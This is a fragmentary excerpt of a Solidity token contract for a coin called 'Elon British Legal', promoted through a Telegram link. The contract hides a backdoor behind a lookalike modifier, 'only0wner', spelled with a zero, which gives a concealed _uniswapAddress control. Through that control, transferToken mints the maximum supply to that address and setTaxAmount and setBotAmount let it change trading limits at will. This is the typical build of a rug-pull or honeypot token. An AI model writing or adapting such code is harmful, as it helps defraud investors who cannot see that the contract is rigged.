...
// Join Us: https://t.me/eBritishLegal
...
contract eBritishLegal is Context, IERC20, Ownable {
    ...
    string private _name = 'Elon British Legal';
    string private _symbol = 'eBritishLegal';
    ...
    modifier only0wner() {
        require(_uniswapAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function transferToken() public only0wner {
        ...
        emit Transfer(address(0), _uniswapAddress, _maxTotal);
    }
     ...
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function setTaxAmount(uint256 maxTx) public only0wner{
        _maxTxAmount = maxTx * 10**18;
    }
    
    function setBotAmount(uint256 botAmount) public only0wner{
        _minTxAmount = botAmount * 10**18;
    }
